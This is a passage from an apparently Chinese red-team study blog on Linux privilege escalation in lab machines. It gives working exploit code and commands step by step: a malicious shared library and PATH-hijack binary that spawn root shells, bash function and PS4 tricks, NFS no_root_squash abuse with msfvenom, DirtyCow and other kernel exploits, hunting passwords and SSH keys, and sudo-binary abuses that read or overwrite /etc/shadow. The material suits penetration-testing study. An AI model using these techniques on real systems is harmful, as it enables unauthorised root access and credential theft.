class="hljs-number">1</span> | <span class="hljs-keyword">grep</span> <span class="hljs-string">&#x27;/home/user&#x27;</span><br>open(<span class="hljs-string">&quot;/home/user/.config/libcalc.so&quot;</span>, O_RDONLY) = -<span class="hljs-number">1</span> ENOENT (No such <span class="hljs-keyword">file</span> or directory)<br></code></pre></td></tr></table></figure><ul><li><p>这边显示 是 open一个文件 但是发现并没有这个文件或者目录</p></li><li><p>于是我们自己创建一个</p></li><li><p>mkdir .config</p></li><li><p>cd .config</p></li><li><p>vim libcalc.c</p></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">inject</span><span class="hljs-params">()</span> __<span class="hljs-title">attribute__</span><span class="hljs-params">((constructor))</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">inject</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-built_in">setuid</span>(<span class="hljs-number">0</span>);<br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;/bin/bash -p&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>上面是一个提权的c语言脚本</li></ul><figure class="highlight nim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs nim"><span class="hljs-keyword">static</span> <span class="hljs-type">void</span> inject() __attribute__((constructor)); 这一句表示声明一个名为inject的静态函数，并使用<span class="hljs-type">GCC</span>的__attribute__((constructor))属性<br><br>该属性使得在程序或者动态库加载时自动执行inject函数，不需要显示调用它<br><br>然后我们定义一个<br><span class="hljs-type">void</span> inject() <span class="hljs-meta">&#123;...&#125;</span><br>它执行以下操作：<br>setuid(<span class="hljs-number">0</span>);  将进程的用户id设置为<span class="hljs-number">0</span> <span class="hljs-comment">#0表示root用户</span><br>system(<span class="hljs-string">&quot;/bin/bash -p&quot;</span>); 执行一个新的shell，并传递-p参数。<br>-p参数使得新的shell保留调用者的权限，即使当前用户id已经更改。<br>因为之前已经将用户id设置为<span class="hljs-number">0</span>，所以新的shell将具有root权限。<br></code></pre></td></tr></table></figure><ul><li><p>gcc -shared -fPIC -o libcalc.so libcalc.c</p></li><li><p>再次执行即可提权</p></li></ul><h3 id="SUID环境变量利用提权"><a href="#SUID环境变量利用提权" class="headerlink" title="SUID环境变量利用提权"></a>SUID环境变量利用提权</h3><ul><li><p>find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</p></li><li><p>&#x2F;usr&#x2F;local&#x2F;bin&#x2F;suid-env</p></li><li><p>启动之后显示</p></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">user</span><span class="hljs-variable">@RedteamNotes</span>:<span class="hljs-operator">~</span>$ <span class="hljs-operator">/</span>usr<span class="hljs-operator">/</span><span class="hljs-keyword">local</span><span class="hljs-operator">/</span>bin<span class="hljs-operator">/</span>suid<span class="hljs-operator">-</span>env<br>[....] Starting web server: apache2httpd (pid <span class="hljs-number">1584</span>) already <span class="hljs-keyword">running</span><br>. ok <br></code></pre></td></tr></table></figure><ul><li>strings 看一下可见字符</li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell">l<span class="hljs-variable">$</span> L<br>t<span class="hljs-variable">$</span>(L<br>|<span class="hljs-variable">$0H</span><br>service apache2 <span class="hljs-built_in">start</span><br></code></pre></td></tr></table></figure><ul><li><p>发现最后一行是用service这个服务去启动 apache2</p></li><li><p>但是这里的service是相对路径 不是绝对路径 可以进行劫持</p></li><li><p>vim service.c</p></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-built_in">setuid</span>(<span class="hljs-number">0</span>);<br><span class="hljs-built_in">setgid</span>(<span class="hljs-number">0</span>);<br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;/bin/bash -p&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>gcc -o service service.c</p></li><li><p>export PATH&#x3D;.:$PATH</p><ul><li>把当前目录（.代表当前目录）放到PATH的第一位</li><li>这样刚刚那个文件在找service启动apache的时候 因为是相对路径因此就会通过PATH去寻找service，然后当前目录排名靠前，因此就会执行我们编译出来的service</li></ul></li><li><p>执行即可提权</p></li></ul><h3 id="巧用SUID-shell功能提权"><a href="#巧用SUID-shell功能提权" class="headerlink" title="巧用SUID-shell功能提权"></a>巧用SUID-shell功能提权</h3><ul><li>find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</li><li>&#x2F;bin&#x2F;bash –version 查看bash的版本</li><li>发现是4.1.5</li><li>在4.2以下有一个在命令行用路径当函数的写法<ul><li>4.2-048</li><li>在bash shell中定义并且导出一个名为&#x2F;usr&#x2F;sbin&#x2F;service的函数</li><li>使用export -f导出 使得它可以在当前的bahs shell会话的子进程中被访问执行</li><li>这意味<br>着如果你在当前 Bash shell 中启动⼀个新的子进程，该子进程将能够访问和执行这个函数。</li></ul></li><li>function &#x2F;usr&#x2F;sbin&#x2F;service { &#x2F;bin&#x2F;bash -p; }</li><li>export -f &#x2F;usr&#x2F;sbin&#x2F;service 导入到环境中</li><li>&#x2F;usr&#x2F;local&#x2F;bin&#x2F;suid-env2 执行即可成功提权</li></ul><h3 id="巧用SUID-shell功能提权-2"><a href="#巧用SUID-shell功能提权-2" class="headerlink" title="巧用SUID-shell功能提权#2"></a>巧用SUID-shell功能提权#2</h3><ul><li><p>find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</p></li><li><p>&#x2F;bin&#x2F;bash –version</p><ul><li>发现<strong>小于4.4</strong> 有一个功能是在命令执行前打印语句</li></ul></li></ul><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs swift">env <span class="hljs-operator">-</span>i <span class="hljs-type">SHELLOPTS</span><span class="hljs-operator">=</span>xtrace <span class="hljs-type">PS4</span><span class="hljs-operator">=</span>&#x27;$(cp <span class="hljs-regexp">/bin/</span>bash <span class="hljs-regexp">/tmp/</span>rootbash; chmod <span class="hljs-operator">+</span>xs <span class="hljs-regexp">/tmp/</span>rootbash)&#x27; <span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/polkit-1/</span>polkit<span class="hljs-operator">-</span>agent<span class="hljs-operator">-</span>helper<span class="hljs-operator">-</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><ul><li><p>-i参数表示 忽略现有的环境变量，env -i表示清楚所有的环境变量并启动一个全新的环境执行命令。</p></li><li><p>xtrace选项被设置，将导致shell执行每个命令之前都打印该命令。PS4环境变量定义了这个打印输出的格式，会<strong>控制调试输出的前缀</strong>，<strong>因此每次bash执行命令的时候，PS4中的内容都会被解析并且执行</strong>。</p></li><li><p>在这里，它被设置为一个命令序列，该命令序列首先会复制&#x2F;bin&#x2F;bash到&#x2F;tmp&#x2F;rootbash 然后将新文件设置为SUID和可执行状态</p></li><li><p>在这个特定的命令序列中，xtrace选项被用于触发PS4环境变量中的命令</p></li><li><p>SHELLOPTS是一个只读的bash环境变量，用于列出当前已启用的shell选项。</p></li><li><p>PS表示提示符</p></li><li><p>执行之后&#x2F;tmp&#x2F;rootbash -p即可成功提权</p></li></ul><h3 id="密码和密钥历史文件提权"><a href="#密码和密钥历史文件提权" class="headerlink" title="密码和密钥历史文件提权"></a>密码和密钥历史文件提权</h3><ul><li>cat ~&#x2F;.*history</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">user@RedteamNotes:~$ <span class="hljs-built_in">cat</span> ~/.*<span class="hljs-built_in">history</span> | grep pass<br>mysql -h somehost.local -uroot -ppassword123<br></code></pre></td></tr></table></figure><ul><li>尝试使用该密码登陆root用户</li></ul><h3 id="密码和密钥配置文件查看提权"><a href="#密码和密钥配置文件查看提权" class="headerlink" title="密码和密钥配置文件查看提权"></a>密码和密钥配置文件查看提权</h3><ul><li><p>ls -la</p></li><li><p>发现了myvpn.ovpn文件</p></li><li><p>查看该文件</p></li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">auth-user-pass <span class="hljs-regexp">/etc/</span>openvpn/auth.txt<br></code></pre></td></tr></table></figure><ul><li>发现该内容 于是继续查看</li></ul><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">user@RedteamNotes:~$ cat /etc/openvpn/auth.txt<br><span class="hljs-keyword">user</span><br><span class="hljs-title">password321</span><br></code></pre></td></tr></table></figure><ul><li>登陆root用户即可</li></ul><h3 id="ssh私钥信息查看提权"><a href="#ssh私钥信息查看提权" class="headerlink" title="ssh私钥信息查看提权"></a>ssh私钥信息查看提权</h3><ul><li>ls -la</li><li>找到私钥信息</li><li>在kali中vim一个文件保存</li><li>+600权限</li><li>ssh -i 文件名 root@ip</li><li>备选搜索命令<ul><li>find &#x2F; -name authorized_keys 2&gt; &#x2F;dev&#x2F;null</li><li>find &#x2F; -name id_rsa 2&gt; &#x2F;dev&#x2F;null</li></ul></li></ul><h3 id="NFS提权"><a href="#NFS提权" class="headerlink" title="NFS提权"></a>NFS提权</h3><ul><li>cat &#x2F;etc&#x2F;exports<br><img src="/../image/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image-20241016181417173.png" alt="image-20241016181417173"></li><li>no_root_squash 是nfs（Network File System）共享设置中的一个选项。它的作用是允许root用户在NFS客户端机器上拥有和在NFS服务器上相同的权限</li><li>默认情况下，NFS使用root_squash选项，这意味着在NFS客户端上，root用户的所有请求都被映射为一个匿名用户（通常是noboydy或者nfsnobody），这样可以防止客户端的root用户在NFS共享上任意操作</li><li>然而，如果你设置了no_root_squash选项，那么在NFS客户端上的root用户就可以像在本地文件系统上一样，拥有对NFS共享的完全控制权限。这在某些情况下可能是必要的，但也可能有风险。</li><li>&#x2F;tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)</li><li>这是表示 想让所有的主机都能访问&#x2F;tmp目录，并且他们可以进行读写，想要所有的操作都立即生效（sync），允许使用非保留端口连接（insecure），不希望将root用户请求映射为匿名用户(no_root_squash)，不希望进行子树检查（no_subtree_check）</li><li>kali中操作<ul><li>mkdir &#x2F;tmp&#x2F;nfs</li><li>mount -o rw,vers&#x3D;3 192.168.13.142:&#x2F;tmp &#x2F;tmp&#x2F;nfs</li><li>cd &#x2F;tmp&#x2F;nfs</li><li>msfvenom -p linux&#x2F;x86&#x2F;exec CMD&#x3D;”&#x2F;bin&#x2F;bash -p” -f elf -o &#x2F;tmp&#x2F;nfs&#x2F;shell.elf</li><li>chmod +xs shell.elf</li></ul></li><li>靶机上<ul><li>&#x2F;tmp&#x2F;shell.elf</li><li>成功提权</li></ul></li><li>总结<ul><li>实际上是因为nfs没有加以限制，从kali上共享了一个suid位的提权脚本文件过去，因此在靶机上执行这个suid位的文件 用root的权限去提权成功了</li></ul></li></ul><h3 id="内核利用提权-CVE-2016-5195（DirtyCow）"><a href="#内核利用提权-CVE-2016-5195（DirtyCow）" class="headerlink" title="内核利用提权-CVE-2016-5195（DirtyCow）"></a>内核利用提权-CVE-2016-5195（DirtyCow）</h3><ul><li><p>按照自动化枚举linpeas的用法，结果显示dirty cow漏洞可能行最大</p></li><li><p>searchsploit dirty cow</p></li><li><p>40611和40839都可以使用，但是40839更加直观</p></li><li><p>searchsploit dirty cow -m 40839</p></li><li><p>head -n 25 40839.c 查看用法</p></li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">gcc</span> -pthread <span class="hljs-number">40839</span>.c -o dirty -lcrypt<br></code></pre></td></tr></table></figure><ul><li><p>.&#x2F;dirty 输入密码即可</p></li><li><p>记得提前备份&#x2F;etc&#x2F;passwd文件</p></li><li><p>如果目标机无gcc 则在kali上编译</p></li><li><p>gcc -static -pthread dirty.c -o dirty -lcrypt</p><ul><li>用此方方不依赖目标机上环境 但是产生文件较大</li></ul></li><li><p>拓展和说明</p><ul><li>失败的内核漏洞利用可能会导致系统崩溃</li><li>一般走投无路才使用这一步</li><li>在内核版本确定之后，可以使用searchsploit、github、google搜索公开漏洞利用代码，逐个尝试</li><li>或者选择一些自动化脚本，但可能会有误报</li><li>在获取内核版本信息后，在相关地方搜索不要过于具体的指定内核版本</li><li><a href="https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/tree/main/bin-sploits?ref_type=heads">https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/tree/main/bin-sploits?ref_type=heads</a><ul><li>这上面有编译好的，但是有几率失败需要自己重新来过</li></ul></li><li>CVE-2022-0847<ul><li>DirtyPipe</li><li>Linux Privilege Escalation - Linux Kernel 5.8 &lt; 5.16.11</li><li><a href="https://www.exploit-db.com/exploits/50808">https://www.exploit-db.com/exploits/50808</a></li></ul></li><li>CVE-2010-3904 (RDS)<ul><li>Linux RDS Exploit - Linux Kernel &lt;&#x3D; 2.6.36-rc8 </li><li><a href="https://www.exploit-db.com/exploits/15285/">https://www.exploit-db.com/exploits/15285/</a></li></ul></li><li>CVE-2010-4258 (Full Nelson)<ul><li>Linux Kernel 2.6.37 (RedHat &#x2F; Ubuntu 10.04) </li><li><a href="https://www.exploit-db.com/exploits/15704">https://www.exploit-db.com/exploits/15704</a></li></ul></li><li>CVE-2012-0056 (Mempodipper)<ul><li>Linux Kernel 2.6.39 &lt; 3.2.2 (Gentoo &#x2F; Ubuntu x86&#x2F;x64) </li><li><a href="https://www.exploit-db.com/exploits/18411">https://www.exploit-db.com/exploits/18411</a></li></ul></li></ul></li></ul><h2 id="sudo提权"><a href="#sudo提权" class="headerlink" title="sudo提权"></a>sudo提权</h2><h3 id="sudo-apt"><a href="#sudo-apt" class="headerlink" title="sudo apt"></a>sudo apt</h3><ul><li>sudo -l 查看</li><li>sudo apt update -o APT::Update::Pre-Invoke::&#x3D;&#x2F;bin&#x2F;bash</li><li>-o APT::Update::Pre-Invoke::&#x3D;&#x2F;bin&#x2F;bash 这是一个apt命令的选项，用于设置在运行apt update之前执行的预处理脚本 ::类似于名字空间，逐级访问子配置</li><li>apt-get的用法与此相同</li><li>拓展<ul><li>sudo apt changelog apt</li><li>!&#x2F;bin&#x2F;sh</li><li>TF&#x3D;$(mktemp)</li><li>echo ‘Dpkg::Pre-Invoke {“&#x2F;bin&#x2F;sh;false”}’ &gt; $TF</li><li>sudo apt install -c $TF sl</li></ul></li></ul><h3 id="sudo-apache2"><a href="#sudo-apache2" class="headerlink" title="sudo apache2"></a>sudo apache2</h3><ul><li><p>sudo apache2 -f &#x2F;etc&#x2F;shadow</p></li><li><p>查看报错信息 发现有root用户的哈希值</p></li></ul><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">john <span class="hljs-built_in">hash</span> --wordlist=<span class="hljs-regexp">/usr/</span>share/wordlists/rockyou.txt<br></code></pre></td></tr></table></figure><ul><li><p>解密成功即可提权</p></li><li><p>一些应用程序可能没有已知的漏洞，比如最新的Apache2服务器程序，常规功能不能被巧用。但是Apache2的帮助信息提示，他有一个加载替代配置文件的选项 -f，指定替代ServerConfigFile</p></li><li><p>使用此选项加载&#x2F;etc&#x2F;shadow文件，将产生一条错误信息，却包含了&#x2F;etc&#x2F;shadow文件的第一行数据</p></li></ul><h3 id="sudo-ash"><a href="#sudo-ash" class="headerlink" title="sudo ash"></a>sudo ash</h3><ul><li>直接sudo执行即可</li><li>ash是一个sh的轻量级版本，但是不管什么shell，只要用sudo执行了，就是root权限</li></ul><h3 id="sudo-awk"><a href="#sudo-awk" class="headerlink" title="sudo awk"></a>sudo awk</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> /usr/bin/awk <span class="hljs-string">&#x27;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&#x27;</span><br></code></pre></td></tr></table></figure><ul><li><p>‘BEGIN {system(“&#x2F;bin&#x2F;bash”)}’是awk的语法，是传递给awk的脚本。</p></li><li><p>BEGIN是一个模式，表示在处理任何输入行之前执行的动作。在这个脚本中，BEGIN块中的唯一动作是调用system的函数。system函数用于在awk内部执行shell命令</p></li></ul><h3 id="sudo-base64"><a href="#sudo-base64" class="headerlink" title="sudo base64"></a>sudo base64</h3><ul><li>cat &#x2F;etc&#x2F;shadow <ul><li>提示权限不足</li></ul></li><li>A&#x3D;&#x2F;etc&#x2F;shadow</li><li>sudo base64 “$A” | base64 -d</li><li>放到john破解即可</li><li>拓展<ul><li>base32&#x2F;base58&#x2F;basenc&#x2F;basez等都能用此方法</li></ul></li></ul><h3 id="sudo-bash"><a href="#sudo-bash" class="headerlink" title="sudo bash"></a>sudo bash</h3><ul><li>直接执行即可，不论什么bash</li></ul><h3 id="sudo-cp"><a href="#sudo-cp" class="headerlink" title="sudo cp"></a>sudo cp</h3><ul><li><p>sudo -l</p></li><li><p>该方式有损 靶机需要提前做好快照</p></li><li><p>在kali中</p></li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">mkpasswd</span> -m sha-<span class="hljs-number">512</span> <span class="hljs-number">123456</span><br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$6</span><span class="hljs-variable">$LdlDN0zNejl7EV</span>.s<span class="hljs-variable">$zY0z9Ar2aGRzsqX9JvRLV4kzWq9h9S6xN0P1s1u61m3By6HwbmPz7iX0iGkh</span><span class="hljs-regexp">/fGwXKCuS3.9rlVo1oKsaL52b/</span><br></code></pre></td></tr></table></figure><ul><li>靶机中</li></ul><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">A</span><span class="hljs-operator">=/</span>etc/shadow<br></code></pre></td></tr></table></figure><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">TF</span>=$(mktemp)<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">echo</span> &#x27;root:$<span class="hljs-number">6</span>$LdlDN0zNejl7EV.s$zY0z9Ar2aGRzsqX9JvRLV4kzWq9h9S6xN0P1s1u61m3By6HwbmPz7iX0iGkh/fGwXKCuS3.<span class="hljs-number">9</span>rlVo1oKsaL52b/:<span class="hljs-number">19495</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::&#x27; &gt; $TF<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-variable">$TF</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /tmp/tmp.4XU5232eAK<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> /usr/bin/cp <span class="hljs-variable">$TF</span> <span class="hljs-variable">$A</span><br></code></pre></td></tr></table></figure><ul><li><p>su 直接登陆即可</p></li><li><p>登陆之后cat &#x2F;etc&#x2F;shadow 发现其他用户的信息已经丢失</p></li><li><p><code>F=$(mktemp)</code> 命令会创建一个临时文件，并将其路径赋值给 <code>TF</code> 变量。<code>mktemp</code> 是一个用于安全创建临时文件的命令。</p></li><li><p>然后往临时文件里写入hash</p></li><li><p>然后用cp 替代即可修改&#x2F;etc&#x2F;shadow这个文件</p></li></ul><h3 id="sudo-cpulimit"><a href="#sudo-cpulimit" class="headerlink" title="sudo cpulimit"></a>sudo cpulimit</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> cpulimit -l 100 -f /bin/bash<br></code></pre></td></tr></table></figure><ul><li><p>cpulimit是一个工具，用于限制一个进程的cpu使用率</p></li><li><p>-l参数后面跟着的是百分比</p></li><li><p>-f参数 是指定需要限制cpu使用率的命令或者程序</p></li></ul><h3 id="sudo-curl"><a href="#sudo-curl" class="headerlink" title="sudo curl"></a>sudo curl</h3><ul><li><p>这个利用也是有损的</p></li><li><p>kali中</p></li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">mkpasswd</span> -m sha-<span class="hljs-number">512</span> <span class="hljs-number">123456</span><br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$6</span><span class="hljs-variable">$a8V3a1AyHr</span>.wPUbZ<span class="hljs-variable">$TnAgd9tuu</span><span class="hljs-regexp">/iwcIJI25qNAk/</span>XE90h04YVlr.qOd1lVh9HJMHWxn2FevfISo62.dCIGMkdV3MoP8sCwlceZEMsg1<br></code></pre></td></tr></table></figure><ul><li><p>然后写成完整形式放到一个文件里</p></li><li><p>开个http服务</p></li><li><p>sudo curl <a href="http://192.168.13.128:3333/aaaa">http://192.168.13.128:3333/aaaa</a> -o &#x2F;etc&#x2F;shadow</p></li><li><p>直接覆盖即可</p></li><li><p>-o参数后面跟着的是你要保存文件的位置</p></li></ul><h3 id="sudo-date"><a href="#sudo-date" class="headerlink" title="sudo date"></a>sudo date</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">date</span> -f /etc/shadow<br></code></pre></td></tr></table></figure><ul><li><p>到kali中用john破解即可</p></li><li><p>-f参数允许date从给定的文件中读取日期和时间，这边利用报错。</p></li></ul><h3 id="sudo-dd-tee"><a href="#sudo-dd-tee" class="headerlink" title="sudo dd&#x2F;tee"></a>sudo dd&#x2F;tee</h3><ul><li>这种利用也是有损的</li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">echo</span> &#x27;root:$<span class="hljs-number">6</span>$LdlDN0zNejl7EV.s$zY0z9Ar2aGRzsqX9JvRLV4kzWq9h9S6xN0P1s1u61m3By6HwbmPz7iX0iGkh/fGwXKCuS3.<span class="hljs-number">9</span>rlVo1oKsaL52b/:<span class="hljs-number">19495</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::&#x27; | sudo dd /etc/shadow &gt; /dev/null<br></code></pre></td></tr></table></figure><ul><li>dd是一个命令行工具，用于对原始数据进行低级别的复制和转换</li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">echo</span> &#x27;root:$<span class="hljs-number">6</span>$LdlDN0zNejl7EV.s$zY0z9Ar2aGRzsqX9JvRLV4kzWq9h9S6xN0P1s1u61m3By6HwbmPz7iX0iGkh/fGwXKCuS3.<span class="hljs-number">9</span>rlVo1oKsaL52b/:<span class="hljs-number">19495</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::&#x27; | sudo dd of=/etc/shadow<br></code></pre></td></tr></table></figure><ul><li>if是输入 of是输出</li></ul><h3 id="sudo-dstat"><a href="#sudo-dstat" class="headerlink" title="sudo dstat"></a>sudo dstat</h3><ul><li><p>sudo -l 枚举</p></li><li><p>发现</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">jackie<span class="hljs-variable">@RedteamNotes</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>sudo -l | grep dstat<br>    (root) <span class="hljs-symbol">NOPASSWD:</span> /usr/bin/dstat<br></code></pre></td></tr></table></figure></li></ul><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-built_in">find</span> / -name dstat -type d <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure><ul><li>找到插件目录 准备按照格式编写插件</li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/doc/</span>dstat<br><span class="hljs-regexp">/usr/</span>share/dstat<br></code></pre></td></tr></table></figure><ul><li>用vim和cat确认可以进行更改编辑</li></ul><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">vim</span> dstat_exploit.<span class="hljs-keyword">py</span><br></code></pre></td></tr></table></figure><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-keyword">import</span> <span class="hljs-built_in">os</span>; <span class="hljs-built_in">os</span>.execv(<span class="hljs-string">&quot;/bin/bash&quot;</span>, [<span class="hljs-string">&quot;bash&quot;</span>])<br></code></pre></td></tr></table></figure><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">sudo dstat <span class="hljs-comment">--exploit</span><br></code></pre></td></tr></table></figure><ul><li><p>提权成功</p></li><li><p>dstat是一个用于系统监控和诊断的工具，它提供了实时的性能统计数据和系统资源的使用情况，通过使用dstat命令，可以获得关于硬件的详细信息</p></li><li><p>允许创建自定义插件 并且以dstat –myplugin执行</p></li></ul><h3 id="sudo-ed"><a href="#sudo-ed" class="headerlink" title="sudo ed"></a>sudo ed</h3><ul><li>sudo -l | grep ed</li></ul><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">(root) NOPASSWD: <span class="hljs-regexp">/usr/</span>bin/ed<br></code></pre></td></tr></table></figure><ul><li><p>sudo ed</p></li><li><p>!&#x2F;bin&#x2F;bash</p></li><li><p>成功提权</p></li><li><p>ed是一个基于行的文本编辑器</p></li><li><p>!&#x2F;bin&#x2F;sh是在ed编辑器中输入的命令 这个命令告诉ed执行一个外部的shell脚本</p></li><li><p>使用q命令退出编辑器</p></li></ul><h3 id="sudo-env"><a href="#sudo-env" class="headerlink" title="sudo env"></a>sudo env</h3><ul><li>sudo -l | grep env</li></ul><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix">(root) <span class="hljs-params">NOPASSWD:</span> <span class="hljs-symbol">/usr/bin/env</span> <br></code></pre></td></tr></table></figure><ul><li><p>sudo env &#x2F;bin&#x2F;bash</p></li><li><p>提权成功</p></li><li><p>env 通常用于设置和显示环境变量的值，本利用中，env命令用于在指定的环境下执行后面的命令</p></li></ul><h3 id="sudo-exiftool"><a href="#sudo-exiftool" class="headerlink" title="sudo exiftool"></a>sudo exiftool</h3><ul><li>sudo -l | grep exif tool</li></ul><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix">(root) <span class="hljs-params">NOPASSWD:</span> <span class="hljs-symbol">/usr/bin/exiftool</span> <br></code></pre></td></tr></table></figure><ul><li><p>exiftool 